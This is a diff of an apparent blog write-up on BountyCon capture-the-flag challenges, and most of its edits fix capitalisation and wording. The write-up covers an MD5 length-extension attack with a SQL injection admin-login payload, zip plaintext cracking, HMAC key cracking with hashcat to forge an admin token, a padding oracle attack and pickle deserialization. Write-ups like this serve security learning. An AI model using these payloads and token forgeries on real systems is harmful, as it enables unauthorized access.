+c 10 # gdb will be on breakpoint under the if condition as input is correct so &quot;3&quot; is the right input for the the flag.
 c
 # Enter :bountycon-3a: as flag for this challenge starts with bountycon-...
-c 11 # length of &quot;bountycon-3&quot; is 11 if message prints on the app then a is wrong guess.
+c 11 # length of &quot;bountycon-3&quot; is 11 if message prints on the app then it is a wrong guess.
 # Enter :bountycon-3m:
 c 11 # gdb will be on breakpoint under the if condition as input is correct
 c
@@ -491,27 +500,27 @@ Checking the source code I didn’t find anything special except &lt;code class=
 
 &lt;p&gt;&lt;img src=&quot;/images/Screenshot_7.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;let’s understand the verify_cookie function.&lt;/p&gt;
+&lt;p&gt;Let’s understand the verify_cookie function.&lt;/p&gt;
 
-&lt;p&gt;cookie value passed to function as the cookie variable. Then cookie string is reversed using strrev($cookie) after then it is decoded by base64 and stored to &lt;code class=&quot;highlighter-rouge&quot;&gt;$cd&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Cookie value passed to function as the cookie variable. Then cookie string is reversed using strrev($cookie) after then it is decoded by base64 and stored to &lt;code class=&quot;highlighter-rouge&quot;&gt;$cd&lt;/code&gt;.&lt;/p&gt;
 
-&lt;p&gt;if string($cd) is &amp;lt;= 32 return false else last 32 character of &lt;code class=&quot;highlighter-rouge&quot;&gt;$cd&lt;/code&gt; contains hash and remaining contains &lt;code class=&quot;highlighter-rouge&quot;&gt;data(email)&lt;/code&gt;.MD5 hash of $secret_cookie_key concatenated with email(&lt;code class=&quot;highlighter-rouge&quot;&gt;MD5($secret_cookie_key+Email)&lt;/code&gt;) is stored to $rhash.&lt;/p&gt;
+&lt;p&gt;If string($cd) is &amp;lt;= 32 return false else last 32 character of &lt;code class=&quot;highlighter-rouge&quot;&gt;$cd&lt;/code&gt; contains hash and remaining contains &lt;code class=&quot;highlighter-rouge&quot;&gt;data(email)&lt;/code&gt;.MD5 hash of $secret_cookie_key concatenated with email(&lt;code class=&quot;highlighter-rouge&quot;&gt;MD5($secret_cookie_key+Email)&lt;/code&gt;) is stored to $rhash.&lt;/p&gt;
 
-&lt;p&gt;then a check is performed if the hash is the same or something has changed with MD5 hash.&lt;/p&gt;
+&lt;p&gt;Then a check is performed if the hash is the same or something has changed with MD5 hash.&lt;/p&gt;
 
-&lt;p&gt;if hash is same then email is put on SQL query and SQL query is executed to get the user and return it.&lt;/p&gt;
+&lt;p&gt;If hash is same then email is placed on SQL query and SQL query is executed to get the user and return it.&lt;/p&gt;
 
 &lt;p&gt;There are two things to note.&lt;/p&gt;
 
 &lt;p&gt;1- Secret key concatenate with user email then MD5 is done.&lt;/p&gt;
 
-&lt;p&gt;2- SQL query is vulnerable to SQL injection.&lt;/p&gt;
+&lt;p&gt;2- SQL query is vulnerable to SQL Injection.&lt;/p&gt;
 
-&lt;p&gt;After googling, I came to know that if the secret key is combined with a user-controlled message then it is vulnerable to a length extension attack. this means the attacker can make a valid hash of secret_cookie_key+new_message without knowing the secret_cookie_key(length of secret_cookie_key needed to be known which is not a big deal, we can try all lengths).&lt;/p&gt;
+&lt;p&gt;After googling, I came to know that if the secret key is combined with a user-controlled message then it is vulnerable to a length extension attack. This means the attacker can make a valid hash of secret_cookie_key+new_message without knowing the secret_cookie_key(length of secret_cookie_key needed to be known which is not a big deal, we can try all lengths).&lt;/p&gt;
 
 &lt;p&gt;Algorithms like MD5, SHA-1, and SHA-2 that are based on the Merkle–Damgård construction are susceptible to this kind of attack.&lt;/p&gt;
 
-&lt;p&gt;So, the idea was to make a valid hash of message with SQL injection(secret_cookie_key+new_message where new_message is containing &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot; or 'role'=&quot;admin&quot;-- -&lt;/code&gt; in the last) to log in as admin by doing SQLi injection.&lt;/p&gt;
+&lt;p&gt;So, the idea was to make a valid hash of message with SQL Injection(secret_cookie_key+new_message where new_message is containing &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot; or 'role'=&quot;admin&quot;-- -&lt;/code&gt; in the end) to log in as admin by doing SQL Injection.&lt;/p&gt;
 
 &lt;p&gt;The key length was 56.&lt;/p&gt;
 
@@ -557,8 +566,8 @@ Checking the source code I didn’t find anything special except &lt;code class=
     &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;GET&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/ui/?tools-flagship&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
     &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getresponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
     &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;sql&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;SQL&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Sql&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Error&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;error&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ERROR&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Failed&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;failed&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#    print(data)
+&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;sql&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;SQL&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Sql&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Error&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;error&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ERROR&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Failed&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;failed&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
         &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
 &lt;span class=&quot;c1&quot;&gt;# bruteforce the key length
@@ -589,33 +598,33 @@ Note: this challenge is not related to Glue.bar at all
 &lt;p&gt;&lt;img src=&quot;/images/Screenshot_9.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;From the page description, it looks like the demo URL was there before it was removed. I decided to look at its archive page. 
-So, I Opened the &lt;code class=&quot;highlighter-rouge&quot;&gt;https://web.archive.org/&lt;/code&gt; and search for &lt;code class=&quot;highlighter-rouge&quot;&gt;https://www.glue.bar/mattsstringreverser/&lt;/code&gt; 
+So, I opened the &lt;code class=&quot;highlighter-rouge&quot;&gt;https://web.archive.org/&lt;/code&gt; and search for &lt;code class=&quot;highlighter-rouge&quot;&gt;https://www.glue.bar/mattsstringreverser/&lt;/code&gt; 
 there was the three snapshot of this page. From which one is &lt;code class=&quot;highlighter-rouge&quot;&gt;https://web.archive.org/web/20191231221341/https://www.glue.bar/mattsstringreverser/&lt;/code&gt;
 which contains the link to the software&lt;/p&gt;
 
-&lt;p&gt;After downloading the zip file and extracting it.it contains demo and index.php file in it which looks like.&lt;/p&gt;
+&lt;p&gt;After downloading the zip file and extracting it. It contains demo and index.php file in it which looks like.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/images/Screenshot_10.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;as you see there is a string in a reversed order which is &lt;code class=&quot;highlighter-rouge&quot;&gt;https://www.glue.bar/mattsstringreverser/matt-himself.jpg&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;As you see there is a string in a reversed order which is &lt;code class=&quot;highlighter-rouge&quot;&gt;https://www.glue.bar/mattsstringreverser/matt-himself.jpg&lt;/code&gt;&lt;/p&gt;
 
 &lt;p&gt;Running the command &lt;code class=&quot;highlighter-rouge&quot;&gt;file matt-himself.jpg&lt;/code&gt; will have an output like&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/images/Screenshot_11.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;where the description has reverse order string &lt;code class=&quot;highlighter-rouge&quot;&gt;version2-secret-preview.zip&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Where the description has reverse order string &lt;code class=&quot;highlighter-rouge&quot;&gt;version2-secret-preview.zip&lt;/code&gt;&lt;/p&gt;
 
-&lt;p&gt;opening &lt;code class=&quot;highlighter-rouge&quot;&gt;https://www.glue.bar/mattsstringreverser/version2-secret-preview.zip&lt;/code&gt; will download the zip file which contains matt-himself.jpg and index.php file. both files are password protected.&lt;/p&gt;
+&lt;p&gt;Opening &lt;code class=&quot;highlighter-rouge&quot;&gt;https://www.glue.bar/mattsstringreverser/version2-secret-preview.zip&lt;/code&gt; will download the zip file which contains matt-himself.jpg and index.php file. Both files are password protected.&lt;/p&gt;
 
-&lt;p&gt;After googling, I came to know that if some plaintext of the zip is known then we can crack the password. In this case, we have plaintext( matt-himself.jpg)&lt;/p&gt;
+&lt;p&gt;After googling, I came to know that if some plaintext of the zip is known then we can crack the password. In this case, we have plaintext(matt-himself.jpg)&lt;/p&gt;
 
 &lt;p&gt;But after trying too much to crack the password(I tried too many tools) this method did not work.&lt;/p&gt;
 
-&lt;p&gt;The next day, I tried the same way but making things similar to &lt;code class=&quot;highlighter-rouge&quot;&gt;glue.bar&lt;/code&gt; server e.g Ubuntu server on AWS instead of a local kali Linux server.&lt;/p&gt;
+&lt;p&gt;The next day, I tried the same way but making things similar to &lt;code class=&quot;highlighter-rouge&quot;&gt;glue.bar&lt;/code&gt; server e.g using Ubuntu server on AWS instead of a local kali Linux machine.&lt;/p&gt;
 
-&lt;p&gt;and this works on AWS with ubuntu.&lt;/p&gt;
+&lt;p&gt;And this works on AWS with Ubuntu. Same method wasn’t work on local kali Linux machine because you have to zip the plaintext file to crack password and zip program of ubuntu and kali wasn’t same(there is some difference). Protected files was zipped on Ubuntu.&lt;/p&gt;
 
-&lt;p&gt;On ubuntu,I used &lt;code class=&quot;highlighter-rouge&quot;&gt;https://github.com/keyunluo/pkcrack&lt;/code&gt; tool to get the password protected files.&lt;/p&gt;
+&lt;p&gt;On Ubuntu, I used &lt;code class=&quot;highlighter-rouge&quot;&gt;https://github.com/keyunluo/pkcrack&lt;/code&gt; tool to get the password protected files.&lt;/p&gt;
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mkdir matt
 cd matt
 wget https://www.glue.bar/mattsstringreverser/matt-himself.jpg
@@ -631,7 +640,7 @@ mv ver2/matt-himself.jpg matt-himselfC.jpg
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;&lt;img src=&quot;/images/Screenshot_12.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;open index.php file from matt-cracked.zip and run it. reverse any string to get the flag.&lt;/p&gt;
+&lt;p&gt;Open index.php file from matt-cracked.zip and run it. Reverse any string to get the flag.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/images/Screenshot_13.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
 
@@ -647,11 +656,11 @@ mv ver2/matt-himself.jpg matt-himselfC.jpg
 https://178.128.95.74/mr/
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;website looks like&lt;/p&gt;
+&lt;p&gt;Website looks like&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/images/Screenshot_14.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;First, just copy the all source code and make a similar website on your local machine. then copy the text in the middle behind the checkbox.&lt;/p&gt;
+&lt;p&gt;First, just copy the all source code and make a similar website on your local machine. Then copy the text in the middle behind the checkbox.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/images/Screenshot_15.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
 
@@ -659,11 +668,9 @@ https://178.128.95.74/mr/
 
 &lt;p&gt;&lt;img src=&quot;/images/Screenshot_16.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Open HTML file in chrome.Open developer tools and in the Source tab.open js file. Click on the pretty print button to Beautify the code.&lt;/p&gt;
+&lt;p&gt;Open HTML file in chrome. Open developer tools and in the source tab. Open the html file. Click on the pretty print button to Beautify the code.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/Untitled3.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Now place breakpoint on &lt;code class=&quot;highlighter-rouge&quot;&gt;[B[h][H]]&amp;amp;15();&lt;/code&gt;.In my case it is on line 73.&lt;/p&gt;
+&lt;p&gt;Now place breakpoint on &lt;code class=&quot;highlighter-rouge&quot;&gt;[B[h][H]]&amp;amp;15();&lt;/code&gt;. In my case it is on line 73.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/images/Screenshot_36.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
 
@@ -721,10 +728,9 @@ y#*/&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;This loop run over on each characters of input text.&lt;/p&gt;
 
-&lt;p&gt;On the console,enter &lt;code class=&quot;highlighter-rouge&quot;&gt;P(BountyCon{&quot;asdsad&quot;})&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;On the console, Enter &lt;code class=&quot;highlighter-rouge&quot;&gt;P(&quot;BountyCon{asdsad}&quot;)&lt;/code&gt;&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;B[h][H]
-D^=B[24][2 + (d++ % 31)] ^ 32
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;D^=B[24][2 + (d++ % 31)] ^ 32
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;Where D contains each character of entered text in the loop.
 To get the flag, we have to hold the condition &lt;code class=&quot;highlighter-rouge&quot;&gt;B[h][H]==D&lt;/code&gt; where we can control the value of D.&lt;/p&gt;
@@ -759,9 +765,9 @@ SyntaxError: Missing parentheses in call to 'print'. Did you mean print(ptext)?
 
 &lt;p&gt;There were three things to know.&lt;/p&gt;
 
-&lt;p&gt;On appending the &lt;code class=&quot;highlighter-rouge&quot;&gt;A&lt;/code&gt; of different length to msg parameter it gives three different messages&lt;/p&gt;
+&lt;p&gt;On appending the &lt;code class=&quot;highlighter-rouge&quot;&gt;A&lt;/code&gt; of different length to msg parameter it gives three different messages.&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1- bad Base64
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1- Bad Base64
 
 2- Bad request: message padding error 
 
@@ -769,7 +775,7 @@ SyntaxError: Missing parentheses in call to 'print'. Did you mean print(ptext)?
 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;which leads me to padding oracle attack.&lt;/p&gt;
+&lt;p&gt;Which leads me to padding oracle attack.&lt;/p&gt;
 
 &lt;p&gt;Below is the script that I used to get the flag.&lt;/p&gt;
 
@@ -835,8 +841,6 @@ SyntaxError: Missing parentheses in call to 'print'. Did you mean print(ptext)?
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Ever wanted to share 20 KiB of text (or less) with a friend but just couldn't? Enter Glue.bar, the original text-sharing application!
 
 https://www.glue.bar/
-
-
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;You can check how the website looks like by opening it. From the website, it looks like a flag is stored in glue and we have to found that glue id.&lt;/p&gt;
@@ -943,7 +947,7 @@ Only our star supporters can see glues without a direct link.
 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;It has no information about the API key. Its showing telling us how to use their API.
+&lt;p&gt;It has no information about the API key. It’s telling us how to use their API.
 I started finding directories in the starclient.glue.bar and found .git directory.
 On opening &lt;code class=&quot;highlighter-rouge&quot;&gt;https://starclient.glue.bar/.git/&lt;/code&gt; it giving &lt;code class=&quot;highlighter-rouge&quot;&gt;403 Forbidden&lt;/code&gt; Error&lt;/p&gt;
 
@@ -999,30 +1003,29 @@ Tried &lt;code class=&quot;highlighter-rouge&quot;&gt;3&lt;/code&gt; for id para
 &lt;h1 id=&quot;i-dont-play&quot;&gt;I Don’t Play&lt;/h1&gt;
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://ik6939fg0f.execute-api.eu-west-2.amazonaws.com/default/qx9nc2
-
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;On opening the website it looked like&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/images/Screenshot_26.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Clicking on &lt;code class=&quot;highlighter-rouge&quot;&gt;login&lt;/code&gt; leads to another website.&lt;/p&gt;
+&lt;p&gt;Clicking on &lt;code class=&quot;highlighter-rouge&quot;&gt;login&lt;/code&gt; redirects to another website.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/images/Screenshot_27.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;On checking the source code of the page,it says &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;!-- AUTH_TOKEN=url_encode(username;base64(hmac-sha256(username))) --&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;On checking the source code of the page, it says &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;!-- AUTH_TOKEN=url_encode(username;base64(hmac-sha256(username))) --&amp;gt;&lt;/code&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/images/Screenshot_28.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;and Clicking on cancel leads us to &lt;code class=&quot;highlighter-rouge&quot;&gt;https://ik6939fg0f.execute-api.eu-west-2.amazonaws.com/default/qx9nc2?AUTH_TOKEN=%3BFZbocBdRNUdHNe2sYnCX05OsnSbRqtPRscvllzbLTB8%3D&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Clicking on cancel leads us to &lt;code class=&quot;highlighter-rouge&quot;&gt;https://ik6939fg0f.execute-api.eu-west-2.amazonaws.com/default/qx9nc2?AUTH_TOKEN=%3BFZbocBdRNUdHNe2sYnCX05OsnSbRqtPRscvllzbLTB8%3D&lt;/code&gt;&lt;/p&gt;
 
-&lt;p&gt;URL decode the following &lt;code class=&quot;highlighter-rouge&quot;&gt;%3BFZbocBdRNUdHNe2sYnCX05OsnSbRqtPRscvllzbLTB8%3D&lt;/code&gt; leads to &lt;code class=&quot;highlighter-rouge&quot;&gt;;FZbocBdRNUdHNe2sYnCX05OsnSbRqtPRscvllzbLTB8=&lt;/code&gt; before is &lt;code class=&quot;highlighter-rouge&quot;&gt;;&lt;/code&gt; is username which is empty and then hmac-sha256 is done on username with some password which we dont know.but what if password is weak.lets bruteforce it.&lt;/p&gt;
+&lt;p&gt;URL decode the following &lt;code class=&quot;highlighter-rouge&quot;&gt;%3BFZbocBdRNUdHNe2sYnCX05OsnSbRqtPRscvllzbLTB8%3D&lt;/code&gt; leads to &lt;code class=&quot;highlighter-rouge&quot;&gt;;FZbocBdRNUdHNe2sYnCX05OsnSbRqtPRscvllzbLTB8=&lt;/code&gt; before &lt;code class=&quot;highlighter-rouge&quot;&gt;;&lt;/code&gt; is username which is empty and then hmac-sha256 is done on username with some password which we dont know. But what if password is weak. Let’s bruteforce it.&lt;/p&gt;
 
-&lt;p&gt;I hashcat with &lt;code class=&quot;highlighter-rouge&quot;&gt;rockyou.txt&lt;/code&gt; file. And found the password which was &lt;code class=&quot;highlighter-rouge&quot;&gt;ilovefacebook&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;I hashcat with &lt;code class=&quot;highlighter-rouge&quot;&gt;rockyou.txt&lt;/code&gt; file and found the password which was &lt;code class=&quot;highlighter-rouge&quot;&gt;ilovefacebook&lt;/code&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/images/Screenshot_29.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;I made the hmac-sha256 for &lt;code class=&quot;highlighter-rouge&quot;&gt;admin&lt;/code&gt; using the password &lt;code class=&quot;highlighter-rouge&quot;&gt;ilovefacebook&lt;/code&gt; and entered that hash to AUTH_TOKEN e.g &lt;code class=&quot;highlighter-rouge&quot;&gt;https://ik6939fg0f.execute-api.eu-west-2.amazonaws.com/default/qx9nc2?AUTH_TOKEN=mEE3YZsG%2FlrlYlmdMlK8tqmA8CKWRwTr9%2FNDcipJF4c%3D&lt;/code&gt; which gave us the flag.&lt;/p&gt;
+&lt;p&gt;I made the hmac-sha256 for &lt;code class=&quot;highlighter-rouge&quot;&gt;admin&lt;/code&gt; using the password &lt;code class=&quot;highlighter-rouge&quot;&gt;ilovefacebook&lt;/code&gt; and entered that hash to AUTH_TOKEN parameter e.g &lt;code class=&quot;highlighter-rouge&quot;&gt;https://ik6939fg0f.execute-api.eu-west-2.amazonaws.com/default/qx9nc2?AUTH_TOKEN=mEE3YZsG%2FlrlYlmdMlK8tqmA8CKWRwTr9%2FNDcipJF4c%3D&lt;/code&gt; which gave us the flag.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/images/Screenshot_30.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
 
@@ -1038,8 +1041,9 @@ Tried &lt;code class=&quot;highlighter-rouge&quot;&gt;3&lt;/code&gt; for id para
 https://mk3pxi9jwe.execute-api.eu-west-2.amazonaws.com/default/s2vx5m
 
 tick_tock.tar.gz
-
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;a href=&quot;/files/tick_tock.tar.gz&quot;&gt;Link to the file&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;In the challenge, a file was given to us which was like&lt;/p&gt;
 
@@ -1126,7 +1130,7 @@ tick_tock.tar.gz
 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;First, File contains the &lt;code class=&quot;highlighter-rouge&quot;&gt;flag&lt;/code&gt; variable which we want to get it. Second, it using &lt;code class=&quot;highlighter-rouge&quot;&gt;pickle&lt;/code&gt; which is not secure from object injection.&lt;/p&gt;
+&lt;p&gt;First, file contains the &lt;code class=&quot;highlighter-rouge&quot;&gt;flag&lt;/code&gt; variable which we want to get it. Second, it’s using &lt;code class=&quot;highlighter-rouge&quot;&gt;pickle&lt;/code&gt; which is not secure from object injection.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/images/Screenshot_31.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
 
@@ -1134,7 +1138,7 @@ tick_tock.tar.gz
 
 &lt;p&gt;Pickle is vulnerable to deserialization attacks so we can execute arbitrary python code.&lt;/p&gt;
 
-&lt;p&gt;I used the below script to get the cookie value to get the flag. I used this script on AWS Lambda. As the target server was running on AWS Lambda. Classes needed to be the same for exploitation.
+&lt;p&gt;I used the below script to get the cookie value to get the flag. I used this script on AWS Lambda. As the target server was running on AWS Lambda, classes needed to be the same for exploitation.
 My solution uses eval to execute a string.&lt;/p&gt;
